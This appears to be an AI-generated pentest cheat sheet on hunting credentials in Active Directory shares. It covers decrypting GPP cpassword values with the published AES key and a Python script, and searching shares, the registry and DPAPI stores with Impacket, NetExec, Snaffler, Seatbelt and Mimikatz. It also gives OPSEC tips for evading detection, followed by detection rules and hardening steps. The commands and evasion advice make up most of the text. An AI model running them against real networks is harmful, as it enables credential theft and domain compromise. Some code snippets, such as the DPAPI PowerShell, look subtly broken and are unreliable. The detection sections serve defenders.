---
title: "Attack #10 — Credential Hunting in Shares GPP Passwords"
description: "This attack is split into two closely related techniques: GPP Password Decryption (a specific catastrophic vulnerability) and broad credential hunting…"
category: active-directory
subcategory: "Credential Access"
tags: ["active-directory"]
tools: ["NetExec", "Impacket", "Mimikatz", "BloodHound", "Metasploit"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #10 — Credential Hunting in Shares  GPP Passwords.md"
---
# 🔴 Attack #10 — Credential Hunting in Shares / GPP Passwords

***

## 📖 How It Works

This attack is split into two closely related techniques: **GPP Password Decryption** (a specific catastrophic vulnerability) and **broad credential hunting across network shares** (a methodology). Both rely on the same fundamental reality — administrators leave plaintext or weakly obfuscated credentials scattered across the network in scripts, config files, Group Policy XML files, and fileshares, readable by any authenticated domain user.

**GPP Passwords** are the crown jewel of this category. Group Policy Preferences (GPP) allowed administrators to configure local account passwords, mapped drives, scheduled tasks, and services across the entire domain via XML files stored in the SYSVOL share. Microsoft embedded these passwords encrypted with AES-256 — but then **published the encryption key in their own MSDN documentation**. Every authenticated domain user has read access to SYSVOL, and the AES key is public, meaning any `cpassword` field in any GPP XML file is effectively plaintext. Microsoft patched the ability to *create* new GPP passwords via MS14-025 in 2014, but **existing GPP passwords were never removed** — and thousands of enterprise environments still have them sitting in SYSVOL today.

The published AES-256-CBC key is:
```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

> ⚠️ **Windows 11 / Server 2025:** GPP functionality is **deprecated** in favor of LAPS (Local Administrator Password Solution). However, legacy GPP XML files remain unencrypted in SYSVOL on any DC still supporting older group policies. Modern deployments should use LAPS v2 (Windows LAPS) instead — see Attack #72 for modern mitigation techniques. If you find GPP passwords in a 2025+ environment, it indicates legacy policy mismanagement.

### GPP XML Files to Target

| File | What It Configures |
|---|---|
| `Groups.xml` | Local administrator accounts + passwords |
| `Services.xml` | Service account credentials |
| `Scheduledtasks.xml` | Scheduled task run-as credentials |
| `DataSources.xml` | Database connection string credentials |
| `Drives.xml` | Mapped drive credentials |
| `Printers.xml` | Printer connection credentials |

### Broader Credential Hunting Locations

| Location | What to Look For |
|---|---|
| `\\DC\SYSVOL\` | GPP XML files (`cpassword`), logon scripts with embedded creds |
| `\\DC\NETLOGON\` | Legacy logon scripts (.bat, .vbs, .ps1) with hardcoded passwords |
| `C:\` / File shares | `web.config`, `appsettings.json`, `.env`, `*.config` — database passwords |
| IT shares (`\\FS01\IT\`) | Admin toolkits, installation scripts, password lists |
| Home drives | User-saved credential files, KeePass databases (.kdbx) |
| Sticky notes / Desktop | `passwords.txt`, `creds.xlsx` — embarrassingly common |
| Registry | AutoLogon credentials, LSA cached credentials |
| IIS / Web configs | Connection strings with SQL sa password |
| Git repositories | Hardcoded API keys, passwords committed to internal repos |

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Any valid domain user** | SYSVOL is readable by all Authenticated Users — zero privilege needed |
| **Network access to DC** | Port 445 (SMB) to read SYSVOL and NETLOGON shares |
| **Read access to file shares** | For broader credential hunting beyond SYSVOL |
| **MS14-025 not applied** | If patched, new GPPs can't be created — but old ones still exist |

***

## 🛠️ Tools

| Tool | Platform | Role |
|---|---|---|
| **Get-GPPPassword.ps1** (PowerSploit) | Windows | Auto-finds and decrypts all GPP cpasswords in SYSVOL |
| **Impacket — Get-GPPPassword.py** | Linux | Remote GPP hunting without domain-joined machine |
| **CrackMapExec / NetExec** | Linux | `--gpp-passwords` module — fast automated sweep |
| **gpp-decrypt** | Linux | CLI tool to decrypt a single cpassword string |
| **pypykatz** | Linux | `gppass` subcommand decrypts cpassword |
| **Metasploit** | Both | `post/windows/gather/credentials/gpp` module |
| **Snaffler** | Windows | Deep credential hunter across all accessible shares |
| **PowerHuntShares** | Windows | PowerShell share auditing + credential discovery |
| **SauronEye** | Windows | Targeted file content search across shares |
| **Trufflehog** | Linux | Scans git repos for secrets, API keys, hardcoded creds |
| **Seatbelt** | Windows | Enumerates credential-related registry keys, cached credentials |
| **findstr / grep** | Both | Manual pattern-based credential search |
| **BloodHound** | Both | Identifies SYSVOL access paths and share permissions |

***

## 💻 Full Commands

### 🔵 Part 1 — GPP Password Attacks

#### 🔴 Impacket — Get-GPPPassword.py (Linux — Fastest Method)

```bash
# ── Automatically find and decrypt ALL GPP passwords from Linux ───────────────
Get-GPPPassword.py corp.local/low_user:'Password1'@DC01.corp.local

# ── Using NT hash (no plaintext password) ────────────────────────────────────
Get-GPPPassword.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  corp.local/low_user@DC01.corp.local

# ── Parse a locally downloaded XML file ──────────────────────────────────────
Get-GPPPassword.py -xmlfile /tmp/Groups.xml LOCAL

# ── With Kerberos ticket ──────────────────────────────────────────────────────
export KRB5CCNAME=low_user.ccache
Get-GPPPassword.py -k -no-pass corp.local/low_user@DC01.corp.local
```

***

#### 🔴 NetExec — GPP Password Module (Linux)

```bash
# ── Sweep all GPP passwords across all accessible DCs ────────────────────────
nxc smb 10.10.10.10 -u low_user -p 'Password1' -M gpp_password

# ── Using NT hash ─────────────────────────────────────────────────────────────
nxc smb 10.10.10.10 -u low_user -H 8846f7eaee8fb117ad06bdd830b7586c -M gpp_password

# ── Find autologon credentials stored in GPP (separate module) ───────────────
nxc smb 10.10.10.10 -u low_user -p 'Password1' -M gpp_autologin
```

***

#### 🔴 PowerSploit — Get-GPPPassword (Windows / Domain-Joined)

```powershell
# ── Import and run Get-GPPPassword ────────────────────────────────────────────
Import-Module .\PowerSploit\Exfiltration\Get-GPPPassword.ps1

# Find and decrypt ALL GPP passwords in SYSVOL
Get-GPPPassword

# Output with full details
Get-GPPPassword | Select-Object UserName, Password, Changed, File | Format-Table

# ── Manual PowerShell search for cpassword ───────────────────────────────────
Get-ChildItem '\\corp.local\SYSVOL' -Recurse -Include *.xml -ErrorAction SilentlyContinue |
  Select-String -Pattern 'cpassword' |
  Select-Object Path, LineNumber, Line

# ── Inline search with findstr (no tools needed) ─────────────────────────────
findstr /S /I cpassword \\corp.local\sysvol\*.xml
```

***

#### 🔴 Manual SYSVOL Enumeration + Decryption (Linux)

```bash
# ── Mount SYSVOL share locally ────────────────────────────────────────────────
sudo mount -t cifs //10.10.10.10/SYSVOL /tmp/sysvol \
  -o username=low_user,password=Password1,domain=corp.local

# ── Recursively search for cpassword ─────────────────────────────────────────
grep -ria cpassword /tmp/sysvol/ 2>/dev/null

# ── Find ALL XML files in SYSVOL ──────────────────────────────────────────────
find /tmp/sysvol/ -name "*.xml" -exec grep -l "cpassword" {} \;

# ── View a specific Groups.xml file ──────────────────────────────────────────
cat "/tmp/sysvol/corp.local/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml"

# ── Sample GPP XML cpassword entry looks like: ────────────────────────────────
# <Properties ... cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
#   userName="Administrator" .../>

# ── Decrypt with gpp-decrypt ─────────────────────────────────────────────────
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
# Output: MySecretPassword123

# ── Decrypt with pypykatz ─────────────────────────────────────────────────────
pypykatz gppass j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw

# ── Manual decryption using Python ───────────────────────────────────────────
python3 - <<'EOF'
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

cpassword = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
# Pad base64 string
padding = "=" * (4 - len(cpassword) % 4)
encrypted = base64.b64decode(cpassword + padding)

# The published Microsoft AES key
key = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
iv = b'\x00' * 16

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)
# Decode UTF-16LE (Windows Unicode)
password = decrypted.decode('utf-16-le').rstrip('\x00')
print(f"Decrypted password: {password}")
EOF
```

***

### 🔵 Part 2 — Broad Credential Hunting in Shares

#### 🔴 Snaffler — Deep Share Credential Hunter (Windows — Best Tool for This)

```powershell
# ── Install / run Snaffler (finds credentials across ALL accessible shares) ───
.\Snaffler.exe -s -d corp.local -o snaffler_output.log -v data

# ── Flags explained:
# -s      = start snaffling immediately
# -d      = target domain
# -o      = output file
# -v data = verbose, show file contents with credentials

# ── Run against specific shares only ──────────────────────────────────────────
.\Snaffler.exe -s -d corp.local -n "\\FS01\IT\" -o output.log

# ── Snaffler classifies finds by severity — look for RED and YELLOW hits:
# 🔴 RED   = credentials / passwords (highest value)
# 🟡 YELLOW = interesting config files / sensitive data
# 🟢 GREEN = potentially interesting

# ── Snaffler finds these automatically:
# web.config with <connectionStrings> passwords
# appsettings.json with database passwords
# .env files with API keys / DB credentials
# id_rsa private SSH keys
# .rdp files with saved passwords
# PowerShell scripts with hardcoded credentials
# KeePass .kdbx databases
# PuTTY saved sessions with passwords
# password.txt / creds.txt / passwords.xlsx
```

***

#### 🔴 NetExec — Share Enumeration + Spider (Linux)

```bash
# ── Enumerate all accessible shares across subnet ────────────────────────────
nxc smb 10.10.10.0/24 -u low_user -p 'Password1' --shares

# ── Spider a specific share and search for credential-related files ───────────
nxc smb 10.10.10.10 -u low_user -p 'Password1' -M spider_plus \
  --share IT --pattern "password,pass,cred,secret,key"

# ── Download files matching pattern ───────────────────────────────────────────
nxc smb 10.10.10.10 -u low_user -p 'Password1' -M spider_plus \
  --share "Users" --pattern ".xml,.config,.txt,.ps1,.bat,.vbs"
```

***

#### 🔴 Trufflehog — Git Repo Credential Scanning (Linux)

```bash
# ── Clone internal git repo and scan for secrets ─────────────────────────────
git clone https://internal-git.corp.local/repo.git
trufflehog git file://./repo --json

# ── Scan for specific patterns: AWS keys, API tokens, hardcoded passwords ─────
trufflehog git file://./repo --regex --patterns "AKIA[0-9A-Z]{16}" --patterns "password.*=.*"

# ── Scan all git history (may find deleted credentials) ──────────────────────
trufflehog git file://./repo --scan-entire-history

# ── Output format — look for "verified" secrets (real credentials, not false positives)
# "verified": true indicates a secret that passed entropy check
```

***

#### 🔴 Seatbelt — Windows Credential Enumeration (Windows)

```powershell
# ── Run Seatbelt with credential modules ───────────────────────────────────
.\Seatbelt.exe -group=credentials

# ── Specific credential modules:
.\Seatbelt.exe LogonPasswords   # LSA cached credentials + plaintext
.\Seatbelt.exe SavedRDPConnections  # RDP .rdp files with saved creds
.\Seatbelt.exe MasterKeys      # DPAPI master keys (needed for credential decryption)
.\Seatbelt.exe CredentialManager   # Windows Credential Manager entries
.\Seatbelt.exe PuttySSHKeys     # PuTTY SSH private keys

# ── Extract all cached credentials
.\Seatbelt.exe -outputfile=seatbelt_creds.txt
```

***

#### 🔴 DPAPI Credential Extraction (Windows)

```powershell
# ── Extract cached DPAPI credentials ───────────────────────────────────────
Get-ChildItem -Path $env:LOCALAPPDATA\Microsoft\Credentials\*
Get-ChildItem -Path $env:APPDATA\Microsoft\Credentials\*

# ── Decrypt DPAPI credentials (requires user session or admin) ──────────────
Add-Type -AssemblyName System.Security
$cred_blob = [System.IO.File]::ReadAllBytes("C:\Users\user\AppData\Local\Microsoft\Credentials\ABC123")
$dpapi = New-Object System.Security.Cryptography.DataProtectionScope("CurrentUser")
$protected = New-Object System.Security.Cryptography.ProtectedData
[System.Text.Encoding]::UTF8.GetString($protected.Unprotect($cred_blob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))

# ── Alternative — use Mimikatz for DPAPI master key extraction ──────────────
mimikatz.exe "dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-... /system:system.reg"
```

***

#### 🔴 Manual Share Credential Hunting (Windows — No Tools)

```powershell
# ── Find password strings in NETLOGON scripts ─────────────────────────────────
findstr /S /I "password" \\corp.local\NETLOGON\*.bat
findstr /S /I "password" \\corp.local\NETLOGON\*.ps1
findstr /S /I "password" \\corp.local\NETLOGON\*.vbs

# ── Hunt across common IT share patterns ─────────────────────────────────────
findstr /S /I "password" \\FS01\IT\*.txt
findstr /S /I "password" \\FS01\IT\*.ps1
findstr /S /I "password" \\FS01\IT\*.bat
findstr /S /I "password" \\FS01\Scripts\*.xml

# ── Find web.config files with credentials ───────────────────────────────────
Get-ChildItem -Recurse -Filter "web.config" \\FS01\ |
  Select-String "password|connectionString" | Select-Object Path, Line

# ── Hunt for KeePass databases ────────────────────────────────────────────────
Get-ChildItem -Recurse -Filter "*.kdbx" \\FS01\ 2>$null

# ── Hunt for private SSH keys ─────────────────────────────────────────────────
Get-ChildItem -Recurse -Filter "id_rsa" \\FS01\ 2>$null

# ── Registry AutoLogon credentials (local machine) ───────────────────────────
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for: DefaultUserName, DefaultPassword, DefaultDomainName
```

***

#### 🔴 Manual Share Credential Hunting (Linux — Mounted Share)

```bash
# ── Mount a target share ──────────────────────────────────────────────────────
sudo mount -t cifs //10.10.10.20/IT /tmp/IT_share \
  -o username=low_user,password=Password1,domain=corp.local

# ── Grep for password strings recursively ────────────────────────────────────
grep -ria "password\|passwd\|pwd\|credentials\|secret" /tmp/IT_share/ \
  --include="*.xml" --include="*.config" --include="*.txt" \
  --include="*.ps1" --include="*.bat" --include="*.vbs" \
  --include="*.json" --include="*.env" \
  2>/dev/null

# ── Find connection strings (database passwords) ─────────────────────────────
grep -ria "connectionString\|Data Source\|Initial Catalog\|User ID\|Password=" \
  /tmp/IT_share/ 2>/dev/null

# ── Find hardcoded NTLM hashes ────────────────────────────────────────────────
grep -riaP "[0-9a-f]{32}:[0-9a-f]{32}" /tmp/IT_share/ 2>/dev/null

# ── Find AWS/Azure/API keys ───────────────────────────────────────────────────
grep -riaP "(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\-_]{35}|secret_key|api_key)" \
  /tmp/IT_share/ 2>/dev/null
```

***

#### 🔴 Hunting Credentials in Registry (Windows)

```powershell
# ── AutoLogon credentials ──────────────────────────────────────────────────────
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
  Select-Object DefaultUserName, DefaultPassword, DefaultDomainName

# ── PuTTY saved sessions (may contain proxy passwords) ───────────────────────
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# ── Windows Credential Manager ────────────────────────────────────────────────
cmdkey /list

# ── VNC saved passwords ───────────────────────────────────────────────────────
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKCU\Software\TightVNC\Server

# ── SNMP community strings ────────────────────────────────────────────────────
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

# ── SCCM / ConfigMgr NAA credentials ─────────────────────────────────────────
Get-WmiObject -Namespace root\ccm\policy\Machine\ActualConfig `
  -Class CCM_NetworkAccessAccount 2>$null
```

***

#### 🔴 Hunting Credentials with PowerView (Domain-Wide)

```powershell
Import-Module .\PowerView.ps1

# ── Find all accessible shares across the domain ─────────────────────────────
Find-DomainShare -Verbose

# ── Find interesting files on accessible shares ───────────────────────────────
Find-InterestingDomainShareFile -Include "*.config","*.xml","*.txt","*.bat","*.ps1"

# ── Find GPP passwords specifically ──────────────────────────────────────────
Get-DomainGPO | Get-GPPPassword

# ── Search for password files across domain ───────────────────────────────────
Find-InterestingDomainShareFile -Include "*password*","*creds*","*credential*"
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **gpp-decrypt returns garbage / mojibake** | Incorrect base64 padding or corrupted cpassword field | Verify cpassword string is complete; check for XML encoding issues; try pypykatz instead |
| **SYSVOL mount fails: "Permission denied"** | User account doesn't have read access to SYSVOL share | Verify user is in domain (not local); try with different credentials; check SMB 445 firewall rule |
| **Snaffler "access denied" on specific share** | User account lacks read permissions on target share | Use `nxc smb --shares` to enumerate readable shares first; skip denied shares |
| **GPP password changed after XML creation** | Administrator rotated the password locally after GPP was deployed | Verify decrypted password against current accounts; may be outdated — try on other systems |
| **No cpassword fields found in SYSVOL** | Either no GPP policies with embedded credentials exist, or MS14-025 was applied + old XMLs deleted | Try broader credential hunting methods (Snaffler, PowerHuntShares); check if LAPS deployed instead |
| **Trufflehog git scan finds nothing** | No credentials committed to git history, or repo is too new | Check commit history depth; expand regex patterns for broader match |
| **Seatbelt credential extraction "access denied"** | Requires user token or admin to decrypt DPAPI credentials | Run as admin; try registry-based hunting instead (AutoLogon, PuTTY keys) |
| **Decrypted GPP password doesn't work on multiple machines** | Local administrator password was changed manually on some systems after GPP was applied | Test password on each system individually; keep list of which systems use which password |

***

## 🎯 OPSEC Tips

- **Read SYSVOL over LDAP first, not SMB** — LDAP-based GPO enumeration generates fewer file access events than direct SMB reads of SYSVOL
- **Use Snaffler over manual grep** in engagements — it's purpose-built, fast, and produces colour-coded output ranked by severity; manual methods trigger more SMB access events
- **Don't open files — read content remotely** — opening files in interactive applications (Excel, Notepad) generates additional process creation events; use `Get-Content` or `cat` instead
- **Start with SYSVOL/NETLOGON** before broader hunting — these are guaranteed readable by all domain users and frequently contain the highest-value credentials with minimum OPSEC risk
- **Check `Groups.xml` first** — this is where local admin passwords live and is the most common GPP vulnerability encountered in real environments
- **Verify GPP cpasswords are still valid** before using them — the password may have been changed manually even if the GPP XML was never cleaned up
- **SCCM Network Access Account (NAA) credentials** are frequently DA-level or broad network access — always check if SCCM is deployed
- **Time-to-execute estimate:** SYSVOL enumeration + decryption (10–15 min) + broader share hunting (20–45 min) = 30–60 minutes total
- **Tool versions:** NetExec preferred over CrackMapExec (actively maintained); Snaffler for Windows; Trufflehog v3+ for git scanning

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **5145** | Security Log | Network share object accessed — bulk reads of `SYSVOL\*.xml` from a single IP |
| **5140** | Security Log | Network share accessed — unusual access to `SYSVOL` or `NETLOGON` from workstations |
| **4663** | Security Log | Attempt made to access object — file reads in SYSVOL (requires object auditing enabled) |
| **4688** | Security Log | Process creation — `findstr.exe` with `cpassword` argument |
| **Sysmon EID 1** | Sysmon | `Snaffler.exe`, `Get-GPPPassword.ps1` or `gpp-decrypt` execution |
| **Sysmon EID 3** | Sysmon | Network connection from unexpected process to SMB port 445 on DC |
| **LDAP query logs** | DC Diagnostic | Bulk GPO object enumeration via LDAP in short time window |

**Primary detection signature:** Multiple SMB file access events (5145) against `\\DC\SYSVOL\...\Policies\**\*.xml` from a single non-admin workstation within a short window is the clearest indicator. In a normal environment, only domain controllers and management workstations read SYSVOL bulk XML — a user workstation accessing dozens of GPO XML files is anomalous.

### Sigma Rules for Detection

**Rule: Suspicious GPP XML Enumeration**
```yaml
title: Bulk SYSVOL GPP XML Access from Non-DC
detection:
  selection:
    EventID: 5145
    ShareName: SYSVOL
    RelativeTargetName|contains: 'Policies'
    RelativeTargetName|endswith: '.xml'
    SourceIP: '!10.10.10.10'  # Exclude DC/admin IPs
  condition: selection | count(SourceIP) by SourceIP > 10 and timespan(5m)
```

**Rule: Suspicious gpp-decrypt or Get-GPPPassword Execution**
```yaml
title: GPP Password Decryption Tool Execution
detection:
  selection_process:
    Image|endswith:
      - 'gpp-decrypt.exe'
      - 'Get-GPPPassword.ps1'
      - 'pypykatz.exe'
  selection_network:
    DestinationPort: 445
    Protocol: SMB
  condition: selection_process and selection_network
```

### EDR-Specific Detections

- **Crowdstrike Falcon:** Flag Snaffler.exe execution + bulk SMB 445 connections; alert on gpp-decrypt with network activity
- **Defender for Endpoint:** Monitor for Get-GPPPassword.ps1 script execution; alert on bulk file reads from SYSVOL
- **Sentinel One:** Correlate PowerShell commands containing "cpassword" with file access events
- **Carbon Black:** Watch for Python-based credential extraction (trufflehog, pypykatz) with network connections to SMB

### Hardening Commands

```powershell
# ── Find and DELETE old GPP XML files from SYSVOL ──────────────────────────
Get-ChildItem -Path "\\DC01\SYSVOL\" -Recurse -Include "Groups.xml","Services.xml",`
  "ScheduledTasks.xml","DataSources.xml","Drives.xml","Printers.xml" |
  Where-Object {$_.LastWriteTime -lt (Get-Date).AddYears(-1)} |
  Remove-Item -Force -WhatIf  # Remove -WhatIf after verification

# ── Deploy LAPS (Local Administrator Password Solution) ──────────────────────
# Install LAPS management tools
Install-Module LAPS -Repository PSGallery -Force

# Configure LAPS via Group Policy
# Computer Configuration → Policies → Administrative Templates →
#   Microsoft LAPS → Enable LAPS

# For Windows LAPS (2023+) — modern replacement for legacy LAPS
# Install via Windows Update / WSUS; configure via Group Policy or MDM

# ── Enforce LDAP signing to prevent relay attacks (bonus mitigation) ────────
dsregcmd /status
# Set via Group Policy:
# Computer Config → Windows Settings → Security Settings → Local Policies →
#   Security Options:
#   "Domain member: Require strong session key (Windows 2000 or later)" = Enabled
#   "LDAP client signing requirements" = Require signing

# ── Restrict SYSVOL read access (advanced — breaks some scenarios) ──────────
icacls "\\DC01\SYSVOL" /grant "Domain Computers":(OI)(CI)(F) /T
icacls "\\DC01\SYSVOL" /remove "Authenticated Users" /T
# WARNING: Only for hardened environments; may break GPO application for workstations

# ── Audit SYSVOL access (enable file auditing) ──────────────────────────────
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
# Enable object auditing on SYSVOL:
# Properties → Security → Advanced → Auditing → Add "Everyone" with "Read" success
```

***

## 🗺️ MITRE ATT&CK

| Technique | ID | Description |
|---|---|---|
| **Credentials in Files** | T1552.001 | Plaintext credentials found in config files, scripts, shares |
| **Group Policy Preferences** | T1552.006 | Decryption of GPP cpassword fields using published AES key |
| **Unsecured Credentials** | T1552 | General category of credential exposure via unencrypted storage |
| **Credential Dumping** | T1003 | DPAPI credential extraction (overlapping technique) |
| **Account Discovery** | T1087 | Enumeration of user accounts from GPP + SYSVOL hunting |
| **Lateral Movement** | T1570 | Using discovered credentials for PtH, credential spray across domain |

***

## 🔗 Attack Chain Context

```
[Credential Hunting / GPP Passwords] ──→ Plaintext Credentials Recovered
         │
         ├──→ 🔑 GPP local admin password → PtH across all domain workstations
         ├──→ 🔑 Service account creds in script → Kerberoasting target eliminated
         ├──→ 🔑 Database SA password → direct database access / data exfil
         ├──→ 🎫 Valid domain creds → BloodHound enumeration → full attack path
         ├──→ 🔑 KeePass .kdbx found → crack master password → full vault access
         ├──→ 🔑 Git repo secrets → API keys, deployment credentials → lateral access
         └──→ 🔑 SCCM NAA creds → often domain-wide read access or DA equivalent

```

**The compounding effect:** GPP credentials, when found, are almost always **local administrator passwords** deployed domain-wide via GPP — meaning the **same decrypted password works on every workstation in the domain** simultaneously. A single `cpassword` field in a Groups.xml file from 2016 can still compromise 500 machines in 2026 if it was never rotated.

**Cross-references:**
- Attack #72: LAPS Deprecation & Takeover (modern LAPS v2 as GPP replacement)
- Attack #9: mitm6 (complementary technique — often combined if credentials insufficient)
- Kerberoasting (Attack #11+) for service account targeting discovered via credential hunting

***

> ✅ **Attack #10 — Credential Hunting / GPP Passwords complete.**
>
> 🎉 **Category 1 — Credential Attacks is now finished.** That's all 10 attacks in the first category covered with full cheat sheets.
>
> Tell me to move on when you're ready to begin **Category 2 — Kerberos Abuse**, starting with **Attack #11 — Golden Ticket Attack**.

Sources
 Plaintext Password Extraction Attack - Netwrix https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/plaintext-password-extraction-attack/
 Pentest-Hints/AD Hunting Passwords In SYSVOL.md at master https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
 Group Policy Preferences | The Hacker Recipes https://legacy.thehacker.recipes/a-d/movement/credentials/dumping/group-policies-preferences
 GPP attacks | Internal Pentest https://xedex.gitbook.io/internalpentest/internal-pentest/active-directory/post-compromise-attacks/gpp-attacks
 Unsecured Credentials: Group Policy Preferences - MITRE ATT&CK® https://attack.mitre.org/techniques/T1552/006/
 Hunting Passwords In SYSVOL - Network Intelligence https://www.networkintelligence.ai/blogs/hunting-passwords-in-sysvol/
 Password in Group Policy Preferences (GPP) Compromise https://rootguard.gitbook.io/cyberops/detection-engineering/threat-detection/ad-detections-and-mitigations/password-in-group-policy-preferences-gpp-compromise
 Automated Implementation of Windows-related Security-Configuration
  Guides https://arxiv.org/pdf/2209.08936.pdf
 Search-based Ordered Password Generation of Autoregressive Neural
  Networks http://arxiv.org/pdf/2403.09954.pdf
 Universal Neural-Cracking-Machines: Self-Configurable Password Models
  from Auxiliary Data http://arxiv.org/pdf/2301.07628.pdf
 SE#PCFG: Semantically Enhanced PCFG for Password Analysis and Cracking https://arxiv.org/pdf/2306.06824.pdf
 Detecting Forged Kerberos Tickets in an Active Directory Environment https://arxiv.org/ftp/arxiv/papers/2301/2301.00044.pdf
 HADES: Detecting Active Directory Attacks via Whole Network Provenance
  Analytics http://arxiv.org/pdf/2407.18858.pdf
 Alice in Passphraseland: Assessing the Memorability of Familiar
  Vocabularies for System-Assigned Passphrases https://arxiv.org/pdf/2112.03359.pdf
 When AI Defeats Password Deception! A Deep Learning Framework to
  Distinguish Passwords and Honeywords http://arxiv.org/pdf/2407.16964.pdf
 Group Policy Preferences - Tactics, Techniques, and Procedures https://ttp.parzival.sh/pentesting/infrastructure/active-directory/group-policy-preferences
 Group Policy Preferences (GPP) password retrieval | The guide https://reaper.gitbook.io/my-penetration-test-guide/guide/privilege-escalation/windows-privilege-escalation/group-policy-preferences-gpp-password-retrieval
 Group Policy Preferences - Tidal Cyber https://app.tidalcyber.com/techniques/57dd1624-42e9-42a6-b1bb-d1d1df233138
 Attacking Active Directory - GPP Credentials https://www.youtube.com/watch?v=sTedpt47t2Y
 Attacking GPP (Group Policy Preferences) Credentials | Active Directory Pentesting https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a?gi=e5aac7720d23
 Group Policy Preferences | yuyudhn's notes https://htb.linuxsec.org/active-directory/credential-hunting/group-policy-preferences
 Attacking GPP (Group Policy Preferences) Credentials - Reddit https://www.reddit.com/r/InfoSecWriteups/comments/xdvst4/attacking-gpp-group-policy-preferences/
 Group Policy Preferences (GPP) Passwords in SYSVOL - Haxoris Wiki https://haxoris.com/haxoris-wiki/active-directory/gpp-cpassword-in-sysvol
